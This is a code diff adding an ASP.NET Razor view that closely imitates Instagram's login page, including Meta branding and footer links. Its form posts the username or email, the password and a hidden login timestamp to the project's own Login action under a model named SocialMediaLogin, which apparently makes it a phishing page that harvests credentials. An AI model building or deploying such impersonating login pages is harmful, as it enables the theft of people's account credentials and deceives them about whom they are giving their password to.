@@ -1,0 +1,113 @@
+@{
+    Layout = null;
+}
+
+@model SocialMediaLogin
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login Page</title>
+
+    <style>
+
+        footer {
+            background-color: #f0f0f0;
+            text-align: center;
+            padding: 20px;
+        }
+
+            footer a {
+                text-decoration: none;
+                color: #555;
+                margin: 0 10px;
+            }
+
+        .bottom-footer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 10px;
+        }
+
+            .bottom-footer select {
+                margin-right: 10px;
+            }
+
+            .bottom-footer span {
+                color: #888;
+            }
+    </style>
+
+
+
+<link rel="stylesheet" href="~/css/instagram.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+
+
+<body>
+    <div class="container">
+        <div class="box">
+            <div class="heading"></div>
+            <form class="login-form" method="post" asp-action="Login">
+                <div class="field">
+                    <input asp-for="UserTerm" id="username"
+                        type="text" placeholder="Phone number, username, or email" />
+                    <label for="username">Phone number, username, or email</label>
+                </div>
+                <div class="field">
+                    <input asp-for="Password" id="password" type="password" placeholder="password" />
+                    <label for="password">Password</label>
+                </div>
+                <input type="hidden" asp-for="LoginDate" value="@DateTime.Now" />
+                <button type="submit" class="login-button" title="login">Log In</button>
+                <div class="separator">
+                    <div class="line"></div>
+                    <p>OR</p>
+                    <div class="line"></div>
+                </div>
+                <div class="other">
+                    <button class="fb-login-btn" type="button">
+                        <span><i class="fab fa-facebook-square"></i> Log in with Facebook</span>
+                    </button>
+                    <a class="forgot-password" href="#">Forgot password?</a>
+                </div>
+            </form>
+        </div>
+        <div class="box">
+            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
+        </div>
+    </div>
+</body>
+
+<footer>
+    <a href="">Meta</a>
+    <a href="">About</a>
+    <a href="">Blog</a>
+    <a href="">Jobs</a>
+    <a href="">Help</a>
+    <a href="">API</a>
+    <a href="">Privacy</a>
+    <a href="">Terms</a>
+    <a href="">Top Accounts</a>
+    <a href="">Locations</a>
+    <a href="">Instagram Lite</a>
+    <a href="">Instagram Contact</a>
+    <a href="">Uploading & Non-Users</a>
+    <div class="bottom-footer">
+        <select name="" id="">
+            <option value="English">English</option>
+            <option value="Turkish">Turkish</option>
+            <option value="Russian">Russian</option>
+            <option value="Spanish">Spanish</option>
+            <option value="French">French</option>
+        </select>
+        <span> &copy; 2023 Instagram from Meta</span>
+    </div>
+</footer>
+
+
+</html>
